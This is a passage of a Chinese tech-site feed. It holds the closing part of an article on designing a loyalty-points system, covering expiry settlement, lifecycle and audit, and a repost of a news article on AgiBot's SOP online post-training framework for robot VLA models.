<p>因为定时任务是<strong>按批次、按时间片执行的</strong>，不可能保证在积分刚刚过期的那一秒，就已经完成结算。如果用户正好在这个时间窗口内发起了积分消费请求，就可能出现一个问题：</p>
<blockquote>
<p>账务上还没来得及结算，但业务上积分已经过期了，能不能用？</p>
</blockquote>
<p>因此，在积分消费链路中，我们会做一层<strong>实时过期校验</strong>，作为兜底保障。</p>
<p>在实际消费时，系统并不会直接根据账户余额扣减，而是基于积分明细进行消费分配（例如 FIFO）。在选取可用积分明细时，会同时校验：</p>
<ul>
<li>明细是否仍然有效；</li>
<li>是否存在过期时间；</li>
<li>当前时间是否已经超过 <code>expired_at</code>。</li>
</ul>
<p>如果发现某条明细在消费时已经过期，即使定时任务还没有处理到它，也会被<strong>直接排除在可消费范围之外</strong>，从而保证不会出现“过期积分被使用”的情况。</p>
<p>这种设计的核心思路是：</p>
<ul>
<li><strong>定时任务负责把账算清楚、状态整理干净；</strong></li>
<li><strong>消费链路负责保证业务行为的绝对正确性。</strong></li>
</ul>
<p>两者各司其职，相互兜底，使积分过期既具备一致性，又不会对系统性能或工程复杂度造成过高压力。</p>
<hr/>
<h3 data-id="heading-60">积分生命周期小结：从产生到消亡</h3>
<p>整体来看，我们并不是把积分当成一个简单的“数值字段”，而是把它当作一类<strong>有完整生命周期的资产</strong>来设计。</p>
<p>一次积分的生命周期，大致会经历四个阶段：</p>
<p><strong>产生 → 可用 → 消费 / 过期 → 结算完成</strong></p>
<p>在积分产生阶段，系统通过事件驱动的方式触发规则计算，将积分拆分为三层数据同时落地： 流水用于审计，明细用于资产管理，账户用于快速查询余额。</p>
<p>在可用阶段，积分以明细形式存在，具备明确的剩余数量和过期时间，既可以被消费，也可能继续等待结算。</p>
<p>在消费阶段，系统并不会简单地扣减账户余额，而是基于积分明细进行选择与扣减，并在消费链路中实时校验是否过期，确保业务行为永远正确。</p>
<p>在过期阶段，积分不会“悄悄消失”，而是通过定时扫描被显式结算： 生成过期流水、更新明细状态、同步账户余额，形成一条完整、可追溯的账务记录。</p>
<p>也正是因为将<strong>扫描结算</strong>与<strong>消费时校验</strong>拆成两条独立但互相兜底的链路，积分系统才能在以下几件事之间取得平衡：</p>
<ul>
<li>不依赖高频定时任务，避免性能风险；</li>
<li>不依赖“刚好扫到”，避免业务正确性问题；</li>
<li>不引入复杂调度机制，控制工程复杂度；</li>
<li>同时保证账务一致性与可审计性。</li>
</ul>
<p>从设计角度看，这套积分生命周期并不是追求“技术上最炫”的方案，而是更关注一件事：</p>
<blockquote>
<p><strong>积分在任何时刻，都处于一个可解释、可追溯、可控制的状态。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-61">写在最后：关于这套积分系统的一点总结</h3>
<p>最后再说一下，我们这套积分系统的设计过程，我也并不是一开始就定了非常完整版方案，而是根据实际业务中遇到的问题，一步步去补齐能力、调整边界、完善细节的。也行当前设计的这套方案也是有缺陷 并不满足大部分业务需求，可能还要进一步完善哈。</p>
<p>我们最初的积分模型，可能只有一张流水表就够用； 再往后，有了活动、有了规则、有了倍率； 再后来，开始关心风险、审计、异常、回溯。</p>
<p>当积分真正变成一种<strong>可运营、可调控、可审计的业务资产</strong>时，原本那种在代码里加减积分的方式，就已经不够用了。</p>
<p>所以整套设计中，我们始终围绕几个核心问题展开：</p>
<ul>
<li>积分是<strong>因为什么</strong>产生的？</li>
<li>积分是<strong>按什么规则</strong>计算的？</li>
<li>积分在什么情况下<strong>不该被发放</strong>？</li>
<li>积分如果出问题，<strong>能不能回溯清楚</strong>？</li>
<li>积分是不是随时都处在一个<strong>可解释的状态</strong>？</li>
</ul>
<p>基于这些问题，我们最终把积分系统拆成了几个清晰的层次：</p>
<ul>
<li>用<strong>事件</strong>限定系统“能感知哪些业务行为”；</li>
<li>用<strong>规则</strong>描述积分的计算方式与边界条件；</li>
<li>用<strong>倍率</strong>承载活动期间的加成逻辑；</li>
<li>用<strong>流水 / 明细 / 账户</strong>分离审计、资产和结果；</li>
<li>用<strong>风控视图与审计链路</strong>兜住系统的安全底线。</li>
</ul>
<p>这些设计并不一定是唯一正确答案，但它们有一个共同点： <strong>每一层都有明确职责，每一个决策都能解释清楚为什么这样做。</strong></p>
<h4 data-id="heading-62">关于积分系统设计，几个容易踩坑的点</h4>
<p>如果要总结一些在实践中反复验证过的经验，大概有这几点：</p>
<ul>
<li>不要把积分当成一个简单数值，它本质上是一种有生命周期的资产；</li>
<li>不要让运营规则直接依赖代码细节，中间一定要有事件和规则的隔离层；</li>
<li>不要把所有限制条件混在一起，触发、发放、倍率、过期要拆清楚；</li>
<li>不要忽视审计能力，没有审计的积分系统，迟早会出问题；</li>
<li>不要过早追求“全自动风控”，可解释性永远比复杂度更重要。</li>
</ul>
<p>很多系统不是一开始就设计错了，而是<strong>缺少边界</strong>，最后被复杂度慢慢拖垮。</p>
<h4 data-id="heading-63">最后附上本次文章 Demo 设计的后台目录结构</h4>
<pre><code class="hljs language-scss" lang="scss">积分服务中心（point-center）
├── 仪表盘
│   └── 积分发放概览 / 风险趋势 / <span class="hljs-attribute">Top</span> 规则
│
├── 积分规则域
│   ├── 积分事件
│   ├── 积分规则
│   └── 积分倍率（活动加成）
│
├── 用户积分
│   ├── 用户积分列表
│   │   ├── 当前积分
│   │   ├── 即将到期积分（<span class="hljs-number">7</span> 天）
│   │   └── VIP / 风险筛选
│   ├── 积分流水（Drawer）
│   └── 积分明细（Drawer）
│
└── 风险管控
    ├── 风险概览
    ├── 异常积分记录
    │   └── 异常详情（串联流水 / 明细）
    ├── 高风险规则
    │   └── 风险因子视图（派生）
    └── 人工操作审计
        └── 操作详情 / 风控回溯
</code></pre>
<p>如果用一句话来概括我们这套系统的目标，那就是：</p>
<blockquote>
<p><strong>让积分这件事，从能跑变成可控、可查、可解释。</strong></p>
</blockquote>
<p>至于是否要一步到位把所有模块都做齐，答案反而很简单： <strong>按业务复杂度逐步演进，比一开始追求完美更重要。</strong></p>
<p>这也是我们在这套积分系统设计中，始终坚持的一个原则。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[智元提出SOP，让VLA模型在真实世界实现可扩展的在线进化]]></title>    <link>https://juejin.cn/post/7592082090206953499</link>    <guid>https://juejin.cn/post/7592082090206953499</guid>    <pubDate>2026-01-06T10:49:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592082090206953499" data-draft-id="7592069432227545097" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="智元提出SOP，让VLA模型在真实世界实现可扩展的在线进化"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-01-06T10:49:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            智元提出SOP，让VLA模型在真实世界实现可扩展的在线进化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:49:42.000Z" title="Tue Jan 06 2026 10:49:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>对于电子产品，我们已然习惯了「出厂即巅峰」的设定：开箱的那一刻往往就是性能的顶点，随后的每一天都在折旧。</p>
<p>但对于通用机器人来说，这个设定必须被颠覆。</p>
<p>试想，如果一个在实验室里完成训练的 AI 机器人，一进家门面对光线稍暗的房间或堆满杂物的茶几就大脑宕机，那它就永远只能是一个昂贵的实验品。这正是当前具身智能面临的尴尬真相：我们在互联网知识里训练出了博学的预训练模型，可一旦让它们走进充满未知的物理世界，这些「理论巨人」往往会因为环境变化而束手无策：「懂」很多道理，却依然干不好家务。</p>
<p>通用机器人的出路，绝不应是被困在出厂设置里的「静态标品」，而应当是能在真实部署中、在每一次失败和纠正中持续变强的生命体。</p>
<p>为了实现这一跨越，智元具身研究中心提出了 SOP（Scalable Online Post-training）框架。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90e9e14a84ba4ef1aca336d6ce2cff8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=%2Bfqj%2BguCJbyZngvZjtWUtt2toI4%3D" alt="图片" loading="lazy"/></p>
<ul>
<li>
<p>论文标题：SOP: A Scalable Online Post-Training System for Vision-Language-Action Models</p>
</li>
<li>
<p>官方博客：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.agibot.com%2Fresearch%2Fsop_zh" target="_blank" title="https://www.agibot.com/research/sop_zh" ref="nofollow noopener noreferrer">www.agibot.com/research/so…</a></p>
</li>
</ul>
<p>SOP，即可扩展在线后训练，是一种颠覆性的机器人学习新范式。据了解，这是业界首次在物理世界的后训练中深度整合了在线、分布式和多任务机制。</p>
<p>通过 SOP 框架，智元具身研究中心构建了一个「多机平行现实」与「云端集中进化」的闭环，进而打破了机器人认知的时间边界，让智能的进化不再止步于出厂的那一刻。</p>
<p>SOP：让机器人实现在真实世界中的分布式持续学习</p>
<p>在过去几年里，基于互联网海量数据预训练的 VLA（视觉 - 语言 - 动作）模型，虽然赋予了机器人一定的通用泛化能力，但始终面临一个难以逾越的鸿沟：「懂」不代表「能」。</p>
<p>预训练模型或许「懂」什么是叠衣服，但当它真正面对一件材质松软、光照复杂的真实衣物时，往往会因为分布偏移而束手无策。</p>
<p>为了解决这个问题，传统的做法是后训练（post-training）。但这通常是一条离线、单机、顺序的漫漫长路：采集数据、离线训练、更新模型、再次部署。这种模式下，机器人探索慢、迭代慢，且很容易在学习新任务时遗忘旧能力。</p>
<p>智元具身研究中心提出的 SOP 颠覆了这一陈旧范式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79eb25e186c947eb92ac766d63e77cf9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=KP65czQiji7hjvOyQHgJSSTgdAs%3D" alt="图片" loading="lazy"/></p>
<p>它将 VLA 的后训练从「单机单打独斗」转变为「在线、集群、并行」的集团军作战。形象地说，SOP 构建了一个「多机平行现实 → 云端集中学习 → 模型即时回流」的超级闭环。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5a2d3e82765403a9c9e01b75cb96906~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=ZwqeY9ba4%2FNWP7UXztnsj2HiroE%3D" alt="图片" loading="lazy"/></p>
<p>分布式机器人队伍：构建「平行现实」</p>
<p>在 SOP 架构下，不再是一台机器人在苦苦探索，而是多台机器人组成集群，共享同一个 VLA 策略。</p>
<p>这就好比在同一时间开启了多个「平行现实」：有的机器人在尝试叠衣服，有的在整理杂货，有的在处理纸盒。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89f6fad573554ba688c19251a8d68aa2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=FgomIo3CSVkTiU3aGn%2BmibIT680%3D" alt="图片" loading="lazy"/></p>
<p>这种空间上的并行，大幅拓宽了真实世界中状态 - 动作分布的覆盖面，让系统能瞬间接触到极其广泛的场景，直接避开了单机学习容易陷入的局部瓶颈。</p>
<p>值得注意的是，人类还可以通过施加少量的干预性修正来加速学习过程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2ec8e018b7f44a1846b7fe66552f791~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=FxYurgTF3kPHMU3F6FrQa4JJ7XU%3D" alt="图片" loading="lazy"/></p>
<p>云端集中在线更新：分钟级的进化速度</p>
<p>所有的运行轨迹、奖励信号甚至人工纠正信息，都会被实时流式上传至云端 GPU 集群。在这里，一个通才学习器（Generalist Learner）夜以继日地运转，持续对策略模型进行在线更新。</p>
<p>为了支撑这种大规模的实时并发，SOP 在底层架构上搭建了一套工业级的分布式数据基座。</p>
<p>系统采用了先进的 Actor-Learner 分离架构，通过消息队列完全解耦了数据生产与消费。这意味着系统具备了「零配置」的弹性水平扩展能力：新的机器人加入集群无需修改任何代码或停机配置，只需连接消息队列即可即插即用，自动分担数据采集任务。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/038e9718e0e5404ca1956429e8fc0422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=z%2F6rXBWqeBFG97U9%2BXFNqq707nk%3D" alt="图片" loading="lazy"/></p>
<p>同时，针对物理世界复杂的网络环境，SOP 建立了严苛的容错与数据原子性机制。依靠本地缓冲和对象存储的原子写入特性，确保了即便在网络波动或节点故障时，数据要么完整保存，要么完全回滚，绝不让脏数据污染核心训练池。</p>
<p>为了让学习更高效，SOP 内置了一个聪明的动态采样器（Adaptive Sampler）。它不像传统模型那样盲目混合数据，而是能根据任务的实时训练损失「查漏补缺」，也就是自动加大对当前薄弱环节的在线数据训练权重。这种有的放矢的学习策略，让位于边缘端的机器人能在数秒至数十秒内获得云端最新进化的大脑，真正实现了群体智能的实时同步。</p>
<p>这意味着，如果一台机器人在北京学会了某个抓取动作的微调，几分钟后，位于上海的另一台机器人就能用上这套最新的记忆。</p>
<p>破解灾难性遗忘：泛化与精度的共存</p>
<p>传统的单机在线训练往往面临一个两难：为了精通某项任务（如叠衣服），模型很容易退化成只懂这一件事的专家，丧失了通用的 VLA 能力。</p>
<p>SOP 通过多任务并行巧妙化解了这一矛盾。因为它是在更广阔的分布中同时进行多任务学习，而非按顺序一个个学，从而确保了 VLA 的通用性不会因针对某一任务的性能提升而受损。</p>
<p>下面展示 SOP 的伪代码：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fca84258b72f470d85fa59b3aba78f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=0KXGx%2Bn1DtYnRo%2F0GGQ429Bn9wE%3D" alt="图片" loading="lazy"/></p>
<p>有效性验证：从鲁棒性涌现到具身智能的 Scaling Law</p>
<p>为了验证 SOP 的有效性，智元具身研究中心团队思考了三个问题：</p>
<ul>
<li>
<p>SOP 对于预训练 VLA 的性能究竟有多大的提升？跟之前的一些离线方案相比呢？</p>
</li>
<li>
<p>分布式机器人队伍的数量规模扩展会如何影响性能？</p>
</li>
<li>
<p>对于不同质量的预训练模型，SOP 能否提供一致的性能增益？</p>
</li>
</ul>
<p>为了解答这三个问题，智元具身研究中心基于自家的智元精灵 G1（Agibot G1）机器人平台进行了实验验证。这是一款拥有双臂 14 个自由度的移动操纵机器人，其头顶与手腕配备的「三目」RGB 视觉系统，配合 7 自由度的灵活手臂和 30Hz 的高频控制，使其具备了在复杂非结构化环境中执行精细微操的硬件基础。</p>
<p>结果呢？相当亮眼！下面我们将深入挖掘实验数据，你将看到：SOP 的技术可行性不仅得到了验证，更展示了极高的「训练性价比」。</p>
<p>超越离线：不仅是成功率的提升，更是鲁棒性的涌现</p>
<p>首先看看实验所选的任务 —— 可以说极具挑战性：从杂货补货任务中涵盖的 500 多种不同形态商品，到叠衣服任务中涉及的柔软易变形物体，甚至包括协同打开冰柜门等复杂动作。这些场景不仅考验机器人的认知能力，更对操作的鲁棒性提出了严苛要求。</p>
<p>在有效性验证中，团队选择了 HG-DAgger（典型的单机在线算法）和 RECAP（最新的 SOTA 离线方法）作为对比基准。实验设计非常直观：先看基线模型表现，再看经过这些算法打磨后的效果，最后看接入 SOP 框架后的「终极形态」。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0be37c29cbf4de3b708777f2aa48235~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=5p7pD8bOfF5CHcD7zJBoKztOpFA%3D" alt="图片" loading="lazy"/></p>
<p>在各类测试场景下，结合 SOP 的在线多机方案全面碾压了传统单机或离线方法。更令人惊喜的细节出现在「叠衣服」和「叠纸盒」这类长序列任务中：SOP 训练出的模型展现了显著的「恢复行为」。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7587b7cc0bce4d4babf3ba56d2afa9e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=oep8EHpP6CzFpVNEZBECBPvoEbQ%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ce5dd7b283d4b899c66b25e6d24b763~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=XrHT2zpRzQw3xEe1L6WoclvUlDQ%3D" alt="图片" loading="lazy"/></p>
<p>这意味着，当机器人在操作中出现细微偏差时，它不再像过去那样直接导致任务失败或中止，而是学会了类似人类的微调动作进行补救。</p>
<p>这种在动态交互中获得的鲁棒性，直接经受住了极限压力的考验：在叠衣服和组装纸盒的长程评估中，SOP 系统实现了超过 36 小时的连续运行且无性能衰减。这种稳定性同时转化为效率的质变，特别是在叠衣服任务中，SOP 将系统的吞吐量直接翻倍，从每小时 21 件提升至 45 件。</p>
<p>以下视频展示了配备了 SOP 的智元精灵 G1 连续 36 小时叠衣服与叠纸盒的视频片段（已加速）：</p>
<p>具身智能的 Scaling Law：用硬件换时间，效率达到原来 2.4 倍</p>
<p>如果说单机试验只是「小试牛刀」，那么关于扩展性的实验则回应了工业界最关心问题：堆机器人数量，真的有用吗？</p>
<p>团队设置了单机、双机和四机三种配置。实验结果（见下表）展现了一个清晰的趋势：随着分布式集群规模的扩大，模型性能呈现出近乎线性的增长。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88d900a74c724e5ab2ca601ce82a13b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=2%2Fm99ys4xJANwvcRwrKwBbGK%2FfM%3D" alt="图片" loading="lazy"/></p>
<p>在严格限制总训练时长为 3 小时的前提下，四机并行学习的最终成功率达到了 92.5%，比单机提升了 12%。更关键的是，SOP 成功将硬件的扩展转化为了学习时长的极致压缩。要达到 80% 的性能基准线，单机苦练需要 174 分钟，而四机战队仅需 72 分钟，训练速度达到原来的 2.4 倍。</p>
<p>这表明，多机并行采集不仅能防止模型对单机特征的过拟合，也证实了在物理世界中，通过增加设备数量来加速模型进化的 Scaling Law 是真实有效的。</p>
<p>突破预训练瓶颈：3 小时实战 &gt; 上百小时数据堆砌</p>
<p>最后一组实验揭示了 SOP 在训练成本上的优势。</p>
<p>团队对比了分别使用 20 小时、80 小时和 160 小时数据预训练的模型。数据显示，虽然预训练规模决定了模型的初始能力，但 SOP 给所有不同基础的模型都带来了稳定的提升。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4f8883e8b8b41a5a06a9d45356b168e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=Cqc5ldm4abHcFQRYFeN%2FEP5XmYo%3D" alt="图片" loading="lazy"/></p>
<p>关键的对比出现在投入产出比上：当预训练数据从 80 小时增加到 160 小时，巨大的算力和数据投入仅带来了 4% 的性能提升，明显的边际效应递减已经出现。然而，在同样的瓶颈期，SOP 仅用了 3 小时的在轨经验，就换来了约 30% 的性能提升。这一数据有力地证明：部署后的在线学习不是对预训练的简单重复，而是更高维度的优化。</p>
<p>但也需要指出，SOP 并非万能药。实验发现，最终的性能上限依然被预训练模型的初始规模所锚定。这表明在线学习本质上是既有知识的超级优化器，而非大规模预训练的完全替代品。</p>
<p>因此，对于追求极致性能的具身智能系统而言，在解决特定长尾问题和弥合「仿真 - 现实」差距时，几小时的真实场景交互，往往比单纯增加几十小时的离线数据更为关键。</p>
<p>当机器人开始进化……</p>
<p>当我们重新审视 SOP 时，会发现它改变的不仅仅是某一项具体的训练技巧，而是整个通用机器人系统的生命周期。在传统的工业逻辑中，产品交付即意味着研发的终点，但在具身智能时代，这个逻辑正被反转。</p>
<p>智元具身研究中心通过 SOP 传达了一个核心理念：通用机器人应当是一个在真实运行中持续进化的「生命体」。</p>
<p>这种范式转变意味着机器人可以带着尚不完美的初始模型上线。对于产业而言，这极大地降低了落地的门槛：我们不再需要等到模型完美无缺才敢让机器人走出实验室，因为部署就是通往完美之路。SOP 能让机器人的每一次任务执行、每一次失败后的纠正都转化为宝贵的训练数据。部署不再是技术迭代的终点，而是更大规模学习的起点。</p>
<p>随着远征、灵犀、精灵、Q1 等机器人走入真实世界，分布式集群的规模将呈指数级增长，我们也将见证一种前所未见的群体智能增长速度。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd78fcffab024625bdf12060fa83f415~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301382&amp;x-signature=gjUGrCC8SWvf4caFz7c69Cm%2FSHE%3D" alt="图片" loading="lazy"/></p>
<p>如果说 VLA 模型让机器人第一次具备了通用的理解与行动能力，那么 SOP 所做的是让众多机器人的经验共同驱动智能的快速成长。它让训练不再被锁死在过去的数据集中，而是让机器智能在每一次交互中不断成长。这或许就是通用机器人走向大规模真实世界部署的关键一步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[港科大教授实测AI眼镜“作弊”：30分钟碾压95%的学生，把传统教学评估体系整破防了]]></title>    <link>https://juejin.cn/post/7592119218029428770</link>    